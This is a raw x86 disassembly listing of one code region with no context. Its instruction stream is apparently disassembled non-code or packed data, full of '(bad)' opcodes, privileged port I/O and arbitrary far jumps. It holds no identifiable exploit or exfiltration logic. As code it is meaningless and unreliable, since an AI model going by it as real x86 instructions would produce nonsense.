  41e23f:	les    esi,FWORD PTR [ecx+esi*2+0x7a5ed9ce]
  41e246:	fdiv   DWORD PTR [eax+0x760472e8]
  41e24c:	xchg   ch,ah
  41e24e:	push   esi
  41e24f:	psrlw  mm0,QWORD PTR [edx]
  41e252:	push   cs
  41e253:	sub    BYTE PTR [edi+edx*2+0x2d],0x86
  41e258:	inc    ecx
  41e259:	ins    DWORD PTR es:[edi],dx
  41e25a:	jp     0x41e272
  41e25c:	adc    ebp,DWORD PTR [ecx]
  41e25e:	mov    BYTE PTR [eax-0x7d],0x70
  41e262:	shl    DWORD PTR [eax-0x2a],0x5
  41e266:	jo     0x41e2e3
  41e268:	ins    DWORD PTR es:[edi],dx
  41e269:	jne    0x41e1f3
  41e26b:	and    al,BYTE PTR [ebx+edx*2-0x443242fc]
  41e272:	loope  0x41e24b
  41e274:	dec    ecx
  41e275:	fnstsw WORD PTR [ebp-0x3d71208d]
  41e27b:	and    BYTE PTR [edi],ch
  41e27d:	dec    edi
  41e27e:	in     eax,dx
  41e27f:	push   ebp
  41e280:	je     0x41e2cc
  41e282:	lods   eax,DWORD PTR ds:[esi]
  41e283:	pop    eax
  41e284:	mov    al,0x31
  41e286:	mov    ebx,0xcedbde93
  41e28b:	mov    esp,0x9d34ff30
  41e290:	lods   al,BYTE PTR ds:[esi]
  41e291:	xor    al,0x1a
  41e293:	or     esi,DWORD PTR [ecx]
  41e295:	pushf  
  41e296:	jl     0x41e22d
  41e298:	push   ss
  41e299:	fmul   st,st(0)
  41e29b:	jnp    0x41e2dc
  41e29d:	jo     0x41e282
  41e29f:	das    
  41e2a0:	mov    ds:0xe22f0d7b,eax
  41e2a5:	repz inc edi
  41e2a7:	fnstsw WORD PTR [eax+0x14bbe411]
  41e2ad:	ret    0x2e91
  41e2b0:	stos   DWORD PTR es:[edi],eax
  41e2b1:	cld    
  41e2b2:	add    edi,edx
  41e2b4:	fadd   DWORD PTR [edi+ecx*2]
  41e2b7:	sti    
  41e2b8:	mov    ds:0x838a8e7e,al
  41e2bd:	mov    bh,0xbe
  41e2bf:	scas   eax,DWORD PTR es:[edi]
  41e2c0:	lea    ecx,[edx-0x20]
  41e2c3:	aaa    
  41e2c4:	inc    edx
  41e2c5:	popf   
  41e2c6:	dec    edi
  41e2c7:	push   0x4feaa97
  41e2cc:	xor    edx,DWORD PTR [ebx-0x41]
  41e2cf:	jb     0x41e345
  41e2d1:	pop    ebx
  41e2d2:	cmc    
  41e2d3:	div    DWORD PTR [edi]
  41e2d5:	sbb    DWORD PTR [eax-0x6],esp
  41e2d8:	adc    DWORD PTR [ebx+0x1c7c61eb],eax
  41e2de:	xchg   edx,eax
  41e2df:	stos   DWORD PTR es:[edi],eax
  41e2e0:	and    dh,BYTE PTR [edi]
  41e2e2:	lock xor bh,bl
  41e2e5:	scas   eax,DWORD PTR es:[edi]
  41e2e6:	inc    ecx
  41e2e7:	mov    DWORD PTR [ecx+0x742bb57e],eax
  41e2ed:	sub    al,0x43
  41e2ef:	xchg   edi,eax
  41e2f0:	sub    cl,BYTE PTR [ecx+ecx*8]
  41e2f3:	bound  eax,QWORD PTR [ebp+eiz*2+0x32]
  41e2f7:	mov    ah,0xd1
  41e2f9:	lahf   
  41e2fa:	add    eax,0x802ad16e
  41e2ff:	mov    bl,0x63
  41e301:	pop    edi
  41e302:	pop    ebx
  41e303:	or     bh,BYTE PTR [eax]
  41e305:	cmp    bl,BYTE PTR [ecx+0x16]
  41e308:	lock dec edi
  41e30a:	mov    edi,0x6560914c
  41e30f:	add    al,0xad
  41e311:	mov    bh,bl
  41e313:	add    eax,0x209fc9ba
  41e318:	sar    BYTE PTR [ebx-0x16],1
  41e31b:	xchg   edx,eax
  41e31c:	repnz pop ebp
  41e31e:	das    
  41e31f:	out    0x20,eax
  41e321:	(bad)  
  41e324:	xchg   esp,eax
  41e325:	mov    bh,0xc1
  41e327:	sbb    eax,0x9e0b68aa
  41e32c:	retf   0xb677
  41e32f:	popa   
  41e330:	jne    0x41e3af
  41e332:	jl     0x41e34a
  41e334:	jle    0x41e302
  41e336:	or     al,0x40
  41e338:	sahf   
  41e339:	aad    0xb3
  41e33b:	adc    BYTE PTR ds:0x5b25ed30,bl
  41e341:	pop    ebx
  41e342:	in     eax,dx
  41e343:	fldcw  WORD PTR [edx+ebp*8]
  41e346:	dec    ebp
  41e347:	retf   
  41e348:	push   cs
  41e349:	cs cli 
  41e34b:	add    DWORD PTR [edx-0x7d],esp
  41e34e:	inc    esi
  41e34f:	leave  
  41e350:	or     al,0xc2
  41e352:	inc    ecx
  41e353:	and    al,0xa2
  41e355:	mov    al,0x91
  41e357:	inc    edx
  41e358:	aad    0xee
  41e35a:	fld    QWORD PTR [edx]
  41e35c:	pop    eax
  41e35d:	das    
  41e35e:	mov    ch,0x65
  41e360:	sub    ebp,edi
  41e362:	mov    ds:0x139e0496,al
  41e367:	push   ecx
  41e368:	sbb    eax,ebx
  41e36a:	xchg   edi,eax
  41e36b:	loope  0x41e2f7
  41e36d:	adc    eax,0xf903dd7
  41e372:	lods   al,BYTE PTR ds:[esi]
  41e373:	add    dh,ah
  41e375:	and    DWORD PTR [eax],ebx
  41e377:	lahf   
  41e378:	stos   BYTE PTR es:[edi],al
  41e379:	inc    edi
  41e37a:	imul   eax,ebx,0x3e081c27
  41e380:	fstp   QWORD PTR [edi]
  41e382:	ret    
  41e383:	sub    eax,0x5b67eed5
  41e388:	add    edi,DWORD PTR [edi-0x41]
  41e38b:	in     al,dx
  41e38c:	inc    eax
  41e38d:	(bad)  
  41e38f:	mov    bl,0x3c
  41e391:	nop
  41e392:	pop    ss
  41e393:	aaa    
  41e394:	pusha  
  41e395:	icebp  
  41e396:	pop    ebx
  41e397:	cs mov cl,0x76
  41e39a:	icebp  
  41e39b:	pop    esi
  41e39c:	dec    eax
  41e39d:	inc    esi
  41e39e:	fld    QWORD PTR [ebx-0x1154ce2b]
  41e3a4:	pop    edi
  41e3a5:	nop
  41e3a6:	inc    esi
  41e3a7:	add    al,bh
  41e3a9:	pop    ebp
  41e3aa:	mov    ah,0x1c
  41e3ac:	(bad)  
  41e3ad:	cwde   
  41e3ae:	jmp    0xf3713a59
  41e3b3:	push   ds
  41e3b4:	ficom  WORD PTR [esp+edx*4+0x14]
  41e3b8:	pop    esp
  41e3b9:	retf   
  41e3ba:	retf   0xb1ec
  41e3bd:	xchg   ecx,eax
  41e3be:	fld    TBYTE PTR ds:0xca4c8db8
  41e3c4:	cmp    al,0xda
  41e3c6:	pop    esp
  41e3c7:	cwde   
  41e3c8:	jo     0x41e3f4
  41e3ca:	xor    eax,0x88b27b26
  41e3cf:	fild   QWORD PTR [ecx+0x37]
  41e3d2:	repz mov esp,DWORD PTR ds:0x96bb52c2
  41e3d9:	outs   dx,DWORD PTR ds:[esi]
  41e3da:	popa   
  41e3db:	psrld  mm5,QWORD PTR [ebp-0x7b]
  41e3df:	xchg   ecx,eax
  41e3e0:	leave  
  41e3e1:	jmp    0x41e3cf
  41e3e3:	leave  
  41e3e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3e5:	hlt    
  41e3e6:	xor    BYTE PTR [edi+0x6e597428],0x70
  41e3ed:	ror    eax,cl
  41e3ef:	add    BYTE PTR [ebx+edi*2+0x13025be1],bh
  41e3f6:	cmp    al,BYTE PTR [ebp+0x4ebac388]
  41e3fc:	stos   DWORD PTR es:[edi],eax
  41e3fd:	ds sahf 
  41e3ff:	in     al,0xb5
  41e401:	and    eax,0xe167e317
  41e406:	dec    edx
  41e407:	ins    DWORD PTR es:[edi],dx
  41e408:	sbb    ebx,DWORD PTR fs:[edi]
  41e40b:	cli    
  41e40c:	or     eax,0xf4f70317
  41e411:	add    al,0x2a
  41e413:	dec    esp
  41e414:	cmp    esi,ecx
  41e416:	or     al,0x91
  41e418:	call   0xfa3c:0xdf1c13ad
  41e41f:	retf   
  41e420:	stc    
  41e421:	fs sub eax,0x443caac
  41e427:	lods   al,BYTE PTR ds:[esi]
  41e428:	inc    esp
  41e429:	stos   BYTE PTR es:[edi],al
  41e42a:	jmp    0x41e3e9
  41e42c:	cmp    DWORD PTR [ebx+0x1a84be3d],esp
  41e432:	push   edx
  41e433:	xchg   ebx,edx
  41e435:	ret    0x5bb4
  41e438:	pop    ss
  41e439:	ret    
  41e43a:	push   0xffffff9f
  41e43c:	lods   eax,DWORD PTR ds:[esi]
  41e43d:	(bad)  
  41e43e:	sbb    al,0x53
  41e440:	adc    al,0x6c
  41e442:	pop    ss
  41e443:	gs pop ebp
  41e445:	fldz   
  41e447:	(bad)  
  41e449:	js     0x41e40c
  41e44b:	in     al,dx
  41e44c:	rcl    al,0xc4
  41e44f:	push   eax
  41e450:	cs test eax,0xb6650d37
  41e456:	test   al,al
  41e458:	push   ss
  41e459:	sub    eax,0x52f9b11e
  41e45e:	and    esi,edi
  41e460:	push   esp
  41e461:	push   ss
  41e462:	imul   BYTE PTR [edx-0x63]
  41e465:	inc    esp
  41e466:	and    BYTE PTR [edx],0x63
  41e469:	mov    fs,WORD PTR [ebp-0x11]
  41e46c:	cwde   
  41e46d:	jmp    0x41e4d1
  41e46f:	xor    al,0x30
  41e471:	jmp    0x30278b0e
  41e476:	xor    al,0x5
  41e478:	jno    0x41e4db
  41e47a:	stos   DWORD PTR es:[edi],eax
  41e47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e47c:	xchg   esp,eax
  41e47d:	sub    DWORD PTR [edi-0xfaebd41],0xc444da33
  41e487:	mov    ds:0xc7d93b6d,eax
  41e48c:	sahf   
  41e48d:	sub    BYTE PTR [ebp-0x5e],cl
  41e490:	xchg   edx,eax
  41e492:	push   edi
  41e493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e494:	repnz push eax
  41e496:	dec    esp
  41e497:	push   ds
  41e498:	xchg   esi,eax
  41e499:	repz mov ch,0x96
  41e49c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e49d:	into   
  41e49e:	inc    ebx
  41e49f:	sub    al,dh
  41e4a1:	xchg   esp,eax
  41e4a2:	xchg   esi,eax
  41e4a3:	popa   
  41e4a4:	xchg   esi,eax
  41e4a5:	out    dx,eax
  41e4a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4a7:	adc    ebx,DWORD PTR [ecx]
  41e4a9:	sub    ecx,DWORD PTR [esi+0x180d6721]
  41e4af:	popf   
  41e4b0:	mov    DWORD PTR [ecx+0x7e0e60dc],ecx
  41e4b6:	mov    edx,DWORD PTR [ebp-0x5c888c8f]
  41e4bc:	sbb    eax,DWORD PTR [edx+0x46248f46]
  41e4c2:	cmp    esp,DWORD PTR [edi-0x17ed1970]
  41e4c8:	scas   al,BYTE PTR es:[edi]
  41e4c9:	loope  0x41e4bc
  41e4cb:	(bad)  
  41e4cc:	das    
  41e4cd:	cdq    
  41e4ce:	dec    ebx
  41e4cf:	pop    esi
  41e4d0:	xor    ecx,DWORD PTR [ecx+0x34]
  41e4d3:	adc    BYTE PTR [eax-0x6e],cl
  41e4d6:	add    BYTE PTR [edi+0x28b0c23b],bh
  41e4dc:	aad    0x82
  41e4de:	(bad)  [eax+0x356eeb69]
  41e4e4:	pushf  
  41e4e5:	xchg   edi,eax
  41e4e6:	mov    ds:0x6d34234b,eax
  41e4eb:	scas   al,BYTE PTR es:[edi]
  41e4ec:	dec    DWORD PTR [eax]
  41e4ee:	lods   eax,DWORD PTR ds:[esi]
  41e4ef:	mov    bh,0xb
  41e4f1:	lahf   
  41e4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4f3:	xor    BYTE PTR [esi],bl
  41e4f5:	stos   DWORD PTR es:[edi],eax
  41e4f6:	pop    ds
  41e4f7:	xor    DWORD PTR [ecx],esi
  41e4f9:	cmp    eax,0x12b54f50
  41e4fe:	int3   
  41e4ff:	outs   dx,BYTE PTR ds:[esi]
  41e500:	fiadd  WORD PTR [edi]
  41e502:	sub    dh,BYTE PTR [ecx-0x34]
  41e505:	mov    DWORD PTR [ebx-0xe09531a],edi
  41e50b:	inc    edx
  41e50c:	(bad)  
  41e50d:	int    0x4d
  41e50f:	inc    edi
  41e510:	push   eax
  41e511:	(bad)
  41e514:	rcl    DWORD PTR [ecx-0x38],1
  41e517:	or     al,0xe7
  41e519:	mov    cl,0x7d
  41e51b:	sbb    bh,BYTE PTR [ebx]
  41e51d:	and    dh,cl
  41e51f:	pop    ebp
  41e520:	les    edx,FWORD PTR [edx]
  41e522:	gs push eax
  41e524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e525:	cli    
  41e526:	das    
  41e527:	ss adc esp,ecx
  41e52a:	add    DWORD PTR [edi+0x47643f88],ebx
  41e530:	add    eax,0x41b59d56
  41e535:	mov    dh,0xe3
  41e537:	cmp    al,0x53
  41e539:	neg    ebp
  41e53b:	enter  0x65fe,0xc4
  41e53f:	add    DWORD PTR [ebx-0x3bf93afe],esi
  41e545:	int3   
  41e546:	sub    eax,DWORD PTR [ecx]
  41e548:	add    eax,0x4dcedce9
  41e54d:	cli    
  41e54e:	out    0x81,eax
  41e550:	mov    edx,0xfd504291
  41e555:	sbb    al,0x27
  41e557:	inc    ecx
  41e558:	dec    eax
  41e559:	xchg   esp,eax
  41e55a:	push   DWORD PTR [ebx-0x696def26]
  41e560:	xchg   ecx,eax
  41e561:	sbb    BYTE PTR [edi],ah
  41e563:	add    al,0x93
  41e565:	call   DWORD PTR [edi-0x69]
  41e568:	jecxz  0x41e54b
  41e56a:	inc    edx
  41e56b:	test   al,0xb6
  41e56d:	pop    ds
  41e56e:	(bad)  
  41e56f:	in     al,dx
  41e570:	adc    eax,0x9907457d
  41e576:	push   ebx
  41e577:	push   es
  41e578:	inc    ebp
  41e579:	sub    cl,bh
  41e57b:	inc    edi
  41e57c:	lahf   
  41e57d:	(bad)  
  41e57e:	lods   eax,DWORD PTR ds:[esi]
  41e57f:	fidiv  WORD PTR [edx+0x55749ba9]
  41e585:	and    DWORD PTR [ebp+0x16],ebx
  41e588:	or     eax,0x28c92cd
  41e58d:	add    DWORD PTR [ecx-0x2166c6ff],ebp
  41e593:	pop    ecx
  41e594:	in     eax,dx
  41e595:	mov    ebx,0x1c4a8613
  41e59a:	call   0x2fb3dde3
  41e59f:	lods   eax,DWORD PTR ds:[esi]
  41e5a0:	push   edi
  41e5a1:	sbb    al,0xe9
  41e5a3:	xchg   ebx,eax
  41e5a4:	seta   BYTE PTR [edi]
  41e5a7:	mov    cl,0x38
  41e5a9:	dec    esp
  41e5aa:	je     0x41e5f8
  41e5ac:	cld    
  41e5ad:	cwde   
  41e5ae:	aas    
  41e5af:	or     cl,BYTE PTR [edi-0x2f890aba]
  41e5b5:	jnp    0x41e614
  41e5b7:	clc    
  41e5b8:	dec    ebp
  41e5b9:	push   ebx
  41e5ba:	push   esp
  41e5bb:	mov    ch,dh
  41e5bd:	sub    DWORD PTR [ecx-0x5f7dafb],0xbaf83fe9
  41e5c7:	and    edx,DWORD PTR [edx+0xe2f5344]
  41e5cd:	pusha  
  41e5ce:	sahf   
  41e5cf:	mov    cl,0x10
  41e5d1:	add    al,0x9
  41e5d3:	mov    esp,0xd1627f7a
  41e5d8:	mov    ch,BYTE PTR [ebx+0x20]
  41e5db:	sbb    ch,BYTE PTR [ecx]
  41e5dd:	mov    esi,0xfe2dac65
  41e5e2:	and    dh,BYTE PTR [eax]
  41e5e4:	inc    BYTE PTR [edi]
  41e5e6:	dec    ebx
  41e5e7:	and    al,0x66
  41e5e9:	in     al,0x83
  41e5eb:	push   ss
  41e5ec:	add    ebp,DWORD PTR [eax-0x10]
  41e5ef:	stos   DWORD PTR es:[edi],eax
  41e5f0:	or     DWORD PTR [edi-0x74ea0264],edx
  41e5f6:	jmp    0xf7aa:0x48f437df
  41e5fd:	lods   al,BYTE PTR ds:[esi]
  41e5fe:	inc    esp
  41e5ff:	xchg   DWORD PTR [edx],esi
  41e601:	jne    0x41e62f
  41e603:	fbld   TBYTE PTR [esi+0x27]
  41e606:	mov    edx,0x858d8adc
  41e60b:	sbb    DWORD PTR [edx],esi
  41e60d:	lock add DWORD PTR [esi],ecx
  41e610:	pop    es
  41e611:	es push edx
  41e613:	sbb    eax,0x289eefb2
  41e618:	dec    ecx
  41e619:	dec    edx
  41e61a:	jno    0x41e60f
  41e61c:	xchg   DWORD PTR [eax],edi
  41e61e:	push   ebp
  41e61f:	iret   
  41e620:	fcom   QWORD PTR [edx]
  41e622:	ds push 0xffffff9f
  41e625:	iret   
  41e626:	push   cs
  41e627:	push   edx
  41e628:	out    dx,eax
  41e629:	pop    edx
  41e62a:	shl    BYTE PTR [ecx+0x41],0x4c
  41e62e:	push   ebx
  41e62f:	and    al,ch
  41e631:	rcr    ebx,cl
  41e633:	fcom   DWORD PTR [ecx-0x6f]
  41e636:	outs   dx,BYTE PTR ds:[esi]
  41e637:	outs   dx,BYTE PTR ds:[esi]
  41e638:	mov    bh,0xde
  41e63a:	and    al,bh
  41e63c:	sbb    DWORD PTR [eax+0x53],ebx
  41e63f:	aad    0xbc
  41e641:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e642:	push   ebx
  41e643:	sbb    al,0xbf
  41e645:	mov    eax,ds:0xeb100fc7
  41e64a:	ins    BYTE PTR es:[edi],dx
  41e64b:	adc    BYTE PTR [edi-0x75],cl
  41e64e:	repz fsub QWORD PTR [ecx-0x7c]
  41e652:	dec    eax
  41e653:	popf   
  41e654:	mov    ds:0x32e4e699,al
  41e659:	pop    ebx
  41e65a:	jno    0x41e665
  41e65c:	stos   DWORD PTR es:[edi],eax
  41e65d:	mov    edx,0xb5873988
  41e662:	lods   eax,DWORD PTR ds:[esi]
  41e663:	ret    
  41e664:	and    ecx,eax
  41e666:	repz popf 
  41e668:	sub    BYTE PTR [ebx-0x51bc17e4],cl
  41e66e:	iret   
  41e66f:	jbe    0x41e64b
  41e671:	pop    ds
  41e672:	ja     0x41e63e
  41e674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e675:	dec    ebp
  41e676:	xchg   esp,eax
  41e677:	outs   dx,DWORD PTR ds:[esi]
  41e678:	mov    edx,edx
  41e67a:	test   BYTE PTR [edx+0x61d52719],al
  41e680:	mov    ch,0x53
  41e682:	out    0x81,al
  41e684:	fstp   TBYTE PTR [ebx+eax*8-0x26cf9172]
  41e68b:	pop    esi
  41e68c:	cmp    BYTE PTR [edi-0x2b],ah
  41e68f:	ret    
  41e690:	mov    esp,0xc73481f6
  41e695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e696:	daa    
  41e697:	dec    ecx
  41e698:	loopne 0x41e62f
  41e69a:	test   eax,0x893ef272
  41e69f:	test   al,0xf3
  41e6a1:	cmp    al,0x3e
  41e6a3:	xchg   edx,eax
  41e6a4:	add    eax,0xd274750d
  41e6a9:	jne    0x41e66b
  41e6ab:	mov    esi,0x764118f1
  41e6b0:	add    DWORD PTR [edx-0x2523ae77],ebp
  41e6b6:	call   0x950df988
  41e6bb:	inc    ebp
  41e6bc:	inc    edi
  41e6bd:	lahf   
  41e6be:	mov    eax,0xbfed23ad
  41e6c3:	test   al,0x53
  41e6c5:	pop    eax
  41e6c6:	out    0x50,al
  41e6c8:	xor    eax,0x46443b5a
  41e6cd:	pop    ebx
  41e6ce:	hlt    
  41e6cf:	or     esi,DWORD PTR [ebx]
  41e6d1:	int3   
  41e6d2:	(bad)  [edi]
  41e6d4:	fnstcw WORD PTR [ecx]
  41e6d6:	daa    
  41e6d7:	push   esp
  41e6d8:	and    DWORD PTR [ecx-0x36],ebp
  41e6db:	push   ecx
  41e6dc:	or     DWORD PTR [eax+0x687447c],ebp
  41e6e2:	mov    es,WORD PTR cs:[edi-0x7a]
  41e6e6:	cld    
  41e6e7:	sti    
  41e6e8:	rcl    BYTE PTR [edi],cl
  41e6ea:	push   eax
  41e6eb:	push   ebx
  41e6ec:	jbe    0x41e6f1
  41e6ee:	clc    
  41e6ef:	dec    esi
  41e6f0:	inc    ebp
  41e6f1:	pop    ecx
  41e6f2:	jnp    0x41e6c2
  41e6f4:	(bad)  
  41e6f6:	fstp   TBYTE PTR [ebx]
  41e6f8:	sbb    BYTE PTR [ebx+0x44],ah
  41e6fb:	outs   dx,DWORD PTR ds:[esi]
  41e6fc:	pop    ds
  41e6fd:	data16 daa 
  41e6ff:	pop    ebx
  41e700:	xor    ecx,ebp
  41e702:	pop    ebx
  41e703:	scas   eax,DWORD PTR es:[edi]
  41e704:	cmp    BYTE PTR [ebx+0xc],ah
  41e707:	outs   dx,BYTE PTR ds:[esi]
  41e708:	dec    BYTE PTR [edi+esi*4-0x57]
  41e70c:	or     al,BYTE PTR [esi-0x3c]
  41e70f:	xor    BYTE PTR [edi+0x55],cl
  41e712:	pop    eax
  41e713:	and    BYTE PTR [edi-0x71],ah
  41e716:	femms  
  41e718:	ficomp DWORD PTR [edx+0x8]
  41e71b:	scas   eax,DWORD PTR es:[edi]
  41e71c:	push   edx
  41e71d:	adc    DWORD PTR [esi+0x57217f8],ecx
  41e723:	xchg   BYTE PTR [ebp+0x47],ah
  41e726:	mov    al,0x14
  41e728:	imul   ebp,DWORD PTR [esp+esi*8],0x5a
  41e72c:	repnz cmp al,0x38
  41e72f:	xor    eax,0xf8dc5b6
  41e734:	mov    eax,0x7415f056
  41e739:	adc    eax,0xc336ce23
  41e73e:	jg     0x41e76c
  41e740:	bound  ecx,QWORD PTR [edx-0x7acb741e]
  41e746:	inc    eax
  41e748:	push   ss
  41e749:	fdiv   DWORD PTR ds:0x7bf9e0b5
  41e74f:	es loope 0x41e71a
  41e752:	sbb    BYTE PTR [edi+0x778cfcf8],ah
  41e758:	ja     0x41e72e
  41e75a:	mul    BYTE PTR [ecx-0x483c98fe]
  41e760:	sub    BYTE PTR [edx+0x36625efc],bl
  41e766:	and    al,0x10
  41e768:	mov    dh,0x5d
  41e76a:	mov    eax,ds:0xa7124161
  41e76f:	jo     0x41e713
  41e771:	cmc    
  41e772:	das    
  41e773:	dec    BYTE PTR [eax+0x1b0c96be]
  41e779:	add    DWORD PTR [ecx],esp
  41e77b:	dec    esp
  41e77c:	lods   al,BYTE PTR ds:[esi]
  41e77d:	jl     0x41e705
  41e77f:	dec    edx
  41e780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e781:	sub    ah,BYTE PTR [edx+0xbde4723]
  41e787:	(bad)  
  41e788:	aas    
  41e789:	sbb    eax,DWORD PTR [eax]
  41e78b:	mov    BYTE PTR [edi+0x1a],ch
  41e78e:	pop    esp
  41e78f:	xor    al,0xd9
  41e791:	mov    ch,0xb
  41e793:	dec    ecx
  41e794:	mov    fs,edx
  41e796:	lods   al,BYTE PTR ds:[esi]
  41e797:	mov    dh,BYTE PTR [edx]
  41e799:	(bad)
  41e79d:	jmp    0xae6d:0xa5064dfa
  41e7a4:	loopne 0x41e7b5
  41e7a6:	(bad)  
  41e7a7:	sbb    al,0x9f
  41e7a9:	test   cl,0x6c
  41e7ac:	push   ebx
  41e7ad:	in     eax,0x5b
  41e7af:	cdq    
  41e7b0:	les    esi,FWORD PTR [eax]
  41e7b2:	cmp    al,BYTE PTR [ebx+0x1141c427]
  41e7b8:	aas    
  41e7b9:	push   edx
  41e7ba:	fadd   DWORD PTR [edi+0x5c76551e]
  41e7c0:	loop   0x41e79f
  41e7c2:	ins    BYTE PTR es:[edi],dx
  41e7c3:	loope  0x41e83d
  41e7c5:	out    0x11,al
  41e7c7:	cmp    ebp,DWORD PTR [esi-0x7ac5866b]
  41e7cd:	jecxz  0x41e7a7
  41e7cf:	push   ecx
  41e7d0:	xor    al,0x99
  41e7d2:	push   0x42
  41e7d4:	mov    edi,0x773db4c1
  41e7d9:	out    dx,al
  41e7da:	pop    ebx
  41e7db:	or     BYTE PTR [eax],cl
  41e7dd:	aaa    
  41e7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7df:	or     ah,BYTE PTR [edi-0x4b]
  41e7e2:	dec    ecx
  41e7e3:	clc    
  41e7e4:	xchg   edx,eax
  41e7e5:	(bad)  
  41e7e6:	adc    edx,DWORD PTR [ebp+0x33d89094]
  41e7ec:	aad    0x97
  41e7ee:	sub    eax,0x87921913
  41e7f3:	into   
  41e7f4:	mov    dh,0x8b
  41e7f6:	loop   0x41e789
  41e7f8:	loope  0x41e84b
  41e7fa:	mov    bl,0x30
  41e7fc:	pop    ecx
  41e7fd:	pop    ecx
  41e7fe:	xor    eax,0xca19cef9
  41e803:	pop    eax
  41e804:	xchg   edx,eax
  41e805:	or     dl,BYTE PTR [esp+eiz*2+0x39]
  41e809:	jmp    0x8d5:0x5f34b806
  41e810:	push   0xffffff9a
  41e812:	sbb    DWORD PTR [eax+0x32],ebp
  41e815:	sbb    BYTE PTR gs:[edx-0x5d],0x78
  41e81a:	loope  0x41e80f
  41e81c:	loop   0x41e7a4
  41e81e:	xor    esp,DWORD PTR [esi+0x10]
  41e821:	jbe    0x41e842
  41e823:	jmp    0xddb8:0xa28f7a82
  41e82a:	js     0x41e80c
  41e82c:	push   edi
  41e82d:	fnsave [ebx]
  41e82f:	fcom   DWORD PTR [esi-0xe]
  41e832:	aaa    
  41e833:	into   
  41e834:	enter  0x395a,0x1a
  41e838:	sub    ebp,DWORD PTR [ebx-0x59]
  41e83b:	cdq    
  41e83c:	jl     0x41e895
  41e83e:	out    0xde,eax
  41e840:	lock xchg BYTE PTR es:[ecx+0x54e222eb],dl
  41e848:	ror    DWORD PTR [ebx-0x5dff85bd],0xf8
  41e84f:	jne    0x41e888
  41e851:	and    edx,0x687327dd
  41e857:	mov    ds:0xdf148464,al
  41e85c:	fmul   QWORD PTR [eax-0x1]
  41e85f:	jo     0x41e800
  41e861:	adc    BYTE PTR cs:[ebx],ah
  41e864:	test   DWORD PTR [edi+0x6f72125a],ecx
  41e86a:	dec    edi
  41e86b:	dec    ecx
  41e86c:	mov    ecx,0x4059c7af
  41e871:	fiadd  DWORD PTR [esi+0x42d706b5]
  41e877:	test   eax,0x6aaa6494
  41e87c:	adc    edx,ebp
  41e87e:	jb     0x41e82e
  41e880:	pop    es
  41e881:	push   edx
  41e882:	fstp   DWORD PTR [edx-0x55]
  41e885:	aam    0xe1
  41e887:	stos   DWORD PTR es:[edi],eax
  41e888:	iret   
  41e889:	sub    BYTE PTR [edx+edi*8],ah
  41e88c:	dec    esp
  41e88d:	inc    ebx
  41e88e:	jne    0x41e822
  41e890:	pop    ebp
  41e891:	in     al,0x1e
  41e893:	dec    esi
  41e894:	cmp    ebp,DWORD PTR [esp+esi*4+0x3f8c6206]
  41e89b:	pop    edi
  41e89c:	add    BYTE PTR [ecx],dl
  41e89e:	jne    0x41e85a
  41e8a0:	adc    al,al
  41e8a2:	call   0x83e9:0x78022187
  41e8a9:	cmc    
  41e8aa:	adc    eax,0xd7e6f9dc
  41e8af:	xchg   DWORD PTR [edi],edi
  41e8b1:	pusha  
  41e8b2:	ins    BYTE PTR es:[edi],dx
  41e8b3:	or     ebp,ecx
  41e8b5:	lock imul edx,DWORD PTR [eax+0x3e],0xffffff81
  41e8ba:	and    DWORD PTR ds:0x49a0d48e,ecx
  41e8c0:	sti    
  41e8c1:	add    BYTE PTR ds:0xe004ae03,0x4f
  41e8c8:	aas    
  41e8c9:	cmp    BYTE PTR [ebx],bh
  41e8cb:	xchg   esp,eax
  41e8cc:	xlat   BYTE PTR ds:[ebx]
  41e8cd:	faddp  st(1),st
  41e8cf:	idiv   BYTE PTR [esi]
  41e8d1:	ss loope 0x41e8d0
  41e8d4:	arpl   WORD PTR [esi],bx
  41e8d6:	mov    ecx,0x80f4b64a
  41e8db:	jmp    0xbc1f490
  41e8e0:	outs   dx,BYTE PTR ds:[esi]
  41e8e1:	sar    BYTE PTR [esi],cl
  41e8e3:	cmc    
  41e8e4:	loop   0x41e93e
  41e8e6:	scas   al,BYTE PTR es:[edi]
  41e8e7:	sub    dl,BYTE PTR [ebx-0xa]
  41e8ea:	pop    ecx
  41e8eb:	dec    eax
  41e8ec:	inc    ebx
  41e8ed:	fisub  DWORD PTR [eax+edi*2]
  41e8f0:	test   eax,0x9d4e56
  41e8f5:	imul   esp,esi,0xffffffcb
  41e8f8:	jno    0x41e93d
  41e8fa:	adc    BYTE PTR [eax+ebp*1+0x6b],0xdc
  41e8ff:	pop    es
  41e900:	je     0x41e96f
  41e902:	call   0x9901:0x32d4c27a
  41e909:	sbb    ecx,DWORD PTR [ebp+0xe]
  41e90c:	es xchg esi,eax
  41e90e:	or     DWORD PTR [edi+0x411c683f],0xffffffdf
  41e915:	sbb    BYTE PTR [eax+0xc],dh
  41e918:	dec    ecx
  41e919:	xchg   ebp,eax
  41e91a:	add    bh,BYTE PTR [eax+ecx*1+0x5b06c6bf]
  41e921:	dec    esp
  41e922:	(bad)  
  41e924:	jle    0x41e943
  41e926:	fiadd  WORD PTR [edi-0x76]
  41e929:	push   0xe93eac86
  41e92e:	push   0xffffffe5
  41e930:	sbb    eax,DWORD PTR [ecx+ecx*2+0x2e]
  41e934:	popf   
  41e935:	test   DWORD PTR [ebx-0x7e],esp
  41e938:	(bad)  
  41e939:	pusha  
  41e93a:	es gs ins BYTE PTR es:[edi],dx
  41e93d:	jne    0x41e973
  41e93f:	mov    bh,0x89
  41e941:	xor    BYTE PTR [edi+0x433bbf32],ah
  41e947:	inc    esp
  41e948:	sahf   
  41e949:	js     0x41e8d6
  41e94b:	add    edi,edi
  41e94d:	lods   eax,DWORD PTR ds:[esi]
  41e94e:	daa    
  41e94f:	xchg   esp,ecx
  41e951:	icebp  
  41e952:	xchg   DWORD PTR ds:0x9a055650,edi
